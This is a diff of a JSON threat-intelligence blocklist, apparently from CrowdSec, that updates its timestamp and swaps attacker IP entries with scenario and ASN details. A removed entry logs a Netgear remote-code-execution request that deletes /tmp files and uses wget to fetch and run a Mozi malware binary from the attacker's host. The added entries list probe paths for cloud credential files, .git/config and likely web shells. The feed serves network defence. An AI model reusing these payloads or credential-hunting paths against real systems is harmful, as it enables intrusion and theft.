@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-06-16T01:00:00Z",
+  "generated_at": "2026-06-16T13:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
@@ -8,67 +8,6 @@
     "v6": 0
   },
   "items": [
-    {
-      "ip": "219.71.131.225",
-      "family": "v4",
-      "first_seen": "2026-06-09T09:00:00Z",
-      "last_seen": "2026-06-09T09:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "9416",
-      "asn_name": "MULTIMEDIA-AS-AP - Hoshin Multimedia Center Inc.",
-      "asn_prefix": "219.70.0.0/15",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://219.71.131.225:49112/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "13.86.116.159",
-      "family": "v4",
-      "first_seen": "2026-06-09T09:00:00Z",
-      "last_seen": "2026-06-09T09:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "13.64.0.0/11",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /actuator/health"
-      ]
-    },
-    {
-      "ip": "35.216.195.77",
-      "family": "v4",
-      "first_seen": "2026-06-09T01:00:00Z",
-      "last_seen": "2026-06-09T01:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "15169",
-      "asn_name": "GOOGLE - Google LLC",
-      "asn_prefix": "35.216.128.0/17",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /info.php"
-      ]
-    },
     {
       "ip": "34.154.5.79",
       "family": "v4",
@@ -1524,6 +1463,103 @@
       "payloads": [
         "GET /",
         "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "34.140.126.56",
+      "family": "v4",
+      "first_seen": "2026-06-16T06:00:00Z",
+      "last_seen": "2026-06-16T06:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /backend/.git/config",
+        "GET /app/.git/config",
+        "GET /frontend/.git/config",
+        "GET /.git/config",
+        "GET /api/.git/config",
+        "GET /v1/.git/config",
+        "GET /src/.git/config",
+        "GET /v2/.git/config",
+        "GET /v3/.git/config",
+        "GET /web/.git/config",
+        "GET /www/.git/config"
+      ]
+    },
+    {
+      "ip": "208.84.101.160",
+      "family": "v4",
+      "first_seen": "2026-06-16T04:00:00Z",
+      "last_seen": "2026-06-16T04:00:00Z",
+      "scenarios": [
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "payloads": [
+        "GET /service-account-file.json",
+        "GET /google-cloud.json",
+        "GET /service_account.json",
+        "GET /google_credentials.json",
+        "GET /google-service-account.json",
+        "GET /wp-content/debug.log",
+        "GET /.aws/credentials",
+        "GET /.docker/config.json",
+        "GET /client_secrets.json",
+        "GET /src/.env",
+        "GET /",
+        "GET /app/credentials.json",
+        "GET /config/gcp-credentials.json",
+        "GET /config/service-account.json",
+        "GET /service-account-credentials.json",
+        "GET /serviceAccountCredentials.json",
+        "GET /gcloud-service-key.json",
+        "GET /keyfile.json",
+        "GET /gcp.json",
+        "GET /firebase-credentials.json"
+      ]
+    },
+    {
+      "ip": "104.28.196.56",
+      "family": "v4",
+      "first_seen": "2026-06-16T02:00:00Z",
+      "last_seen": "2026-06-16T02:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-wordpress-scan"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "payloads": [
+        "GET /wp-admin/admin-ajax.php",
+        "GET /wp-admin/css/index.php",
+        "GET /wp-admin/txets.php",
+        "GET /wp-content/plugins/hellopress/wp_mna.php",
+        "GET /wp-content/plugins/index.php",
+        "GET /ms-themes.php",
+        "GET /chosen.php?p=",
+        "GET /file.php",
+        "GET /flower.php",
+        "GET /gifclass.php",
+        "GET /bless.php",
+        "GET /class-t.api.php",
+        "GET /blurbs.php",
+        "GET /akcc.php",
+        "GET /abcd.php",
+        "GET /shelp.php"
       ]
     }
   ]
